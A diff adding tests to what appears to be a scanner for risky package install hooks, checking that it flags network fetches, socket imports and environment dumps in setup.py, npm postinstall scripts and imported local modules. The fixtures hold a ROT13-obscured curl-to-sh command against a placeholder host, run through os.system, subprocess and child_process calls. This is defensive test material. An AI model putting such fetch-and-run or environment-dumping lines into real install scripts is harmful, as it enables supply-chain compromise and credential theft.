@@ -216,6 +216,59 @@ def test_setup_py_subprocess_is_info(tmp_path):
     assert ids_at(report, "setup.py") == {"BS-PRC-001"}
 
 
+def test_commands_that_setup_py_runs_are_analysed(tmp_path):
+    fetch_and_run = rot("phey -fFY uggcf://rknzcyr.vainyvq/v | fu")
+    root = build(tmp_path, {"setup.py": (
+        "import os, subprocess, sys\n"
+        f"os.system({fetch_and_run!r})\n"
+        f"subprocess.Popen(['sh', '-c', {fetch_and_run!r}])\n"
+        "subprocess.run([sys.executable, '-c', 'import socket'])\n"
+        "subprocess.run(command)\n"  # not a literal: only the process call is reported
+    )})
+    report = scan([root])
+    lines = sorted((f.rule.id, f.region.line) for f in report.findings
+                   if f.rule.id != "BS-PRC-001")
+    assert lines == [("BS-NET-002", 2), ("BS-NET-002", 3), ("BS-NET-003", 4)]
+    [entry] = report.entry_points
+    assert all(f.level is Level.HIGH for f in report.findings if f.rule.id == "BS-NET-002")
+    assert entry.kind == "setup.py"
+
+
+def test_commands_that_an_install_script_runs_are_analysed(tmp_path):
+    fetch_and_run = rot("phey -fFY uggcf://rknzcyr.vainyvq/v | fu")
+    root = build(tmp_path, {
+        "package.json": package({"postinstall": "node install.js"}),
+        "install.js": (
+            "const cp = require('child_process');\n"
+            f"cp.execSync({json.dumps(fetch_and_run)});\n"
+            f"cp.spawn('sh', ['-c', {json.dumps(fetch_and_run)}], {{stdio: 'inherit'}});\n"
+            "cp.spawnSync('node', ['-e', \"require('net')\"]);\n"
+            "cp.exec(command);\n"
+        ),
+    })
+    report = scan([root])
+    lines = sorted((f.rule.id, f.region.line) for f in report.findings
+                   if f.path.endswith("install.js") and f.rule.id != "BS-PRC-001")
+    assert lines == [("BS-NET-002", 2), ("BS-NET-002", 3), ("BS-NET-003", 4)]
+
+
+def test_local_modules_that_setup_py_imports_are_followed(tmp_path):
+    root = build(tmp_path, {
+        "setup.py": "from setuptools import setup\nfrom demo.build import hook\nsetup()\n",
+        "demo/__init__.py": "from . import version\n",
+        "demo/version.py": "import os\nprint(dict(os.environ))\n",
+        "demo/build.py": "import socket\n",
+        "demo/unused.py": "import urllib.request\n",
+    })
+    report = scan([root])
+    [entry] = report.entry_points
+    assert sorted(t.rsplit("/", 1)[-1] for t in entry.targets) == [
+        "__init__.py", "build.py", "setup.py", "version.py"]
+    assert ids_at(report, "build.py") == {"BS-NET-003"}
+    assert ids_at(report, "version.py") == {"BS-ENV-001"}
+    assert ids_at(report, "unused.py") == set()
+
+
 def test_copies_of_the_environment_count_only_when_serialised(tmp_path):
     root = build(tmp_path, {"setup.py": (
         "import json, os, subprocess\n"
